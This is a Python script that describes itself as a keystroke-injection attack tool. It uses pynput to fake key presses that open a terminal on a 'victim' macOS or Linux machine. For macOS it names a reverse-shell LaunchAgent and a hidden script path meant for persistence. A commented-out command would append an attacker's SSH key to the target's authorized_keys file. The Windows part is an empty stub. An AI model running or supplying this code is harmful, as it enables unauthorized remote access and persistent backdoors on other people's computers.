from time import sleep
from pynput.keyboard import Key, Controller
import argparse
import os

SUP_OS = ['MacOS','Linux','Win10']

parser = argparse.ArgumentParser(description='Key Stroke Injection attack script')
parser.add_argument('--os', type=str, default='MacOS', 
					help='Victim OS', choices=SUP_OS)

args = parser.parse_args()

def mac_shell(kb):
	kb.press(Key.cmd_r)
	kb.press(' ')
	kb.release(' ')
	kb.release(Key.cmd_r)
	sleep(.2)
	kb.type('terminal')
	sleep(.2)
	enter(keyboard)

def linux_shell(kb):
	kb.press(Key.ctrl_l)
	kb.press(Key.alt_l)
	kb.press('t')
	kb.release(Key.ctrl_l)
	kb.release(Key.alt_l)
	kb.release('t')

def win_cmd(kb):
	# here pynput code for activating win cmd
	pass

def enter(kb):
	kb.press(Key.enter)
	kb.release(Key.enter)
	
def type_cmd(kb, command):
	sleep(.5)
	kb.type(command)
	sleep(.2)
	enter(kb)

keyboard = Controller()
sleep(3)

CRON_DEST_FN = '' # filename of the cron file in the victim machine
PAYLOAD_FN = '' # filename of the payload which must be in ./args.os/

# Open a terminal for our respective system
if (args.os == 'MacOS'):
	mac_shell(keyboard)
	PAYLOAD_FN = 'rs.plist'
	SCRIPT_FN = 'rs.sh'
	CRON_DEST_FN = './Library/LaunchAgents/rs.plist'
	SCRIPT_DEST_FN = './Applications/.rs.sh'
	
elif (args.os == 'Linux'):
	linux_shell(keyboard)
	
else:
	win_cmd(keyboard)

'''
Rest not used because the linux target system couldn't handle the 
keystroke input throughput.
'''

# Inserting SSH key to targets authorized_keys file
#type_cmd(keyboard, 'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWsaYMfynllFnvDF7H37hVv6l3QPLjdSBQj2WyXHr0H" >> ~/.ssh/authorized_keys')
#sleep(.5)

#type_cmd(keyboard, 'exit')
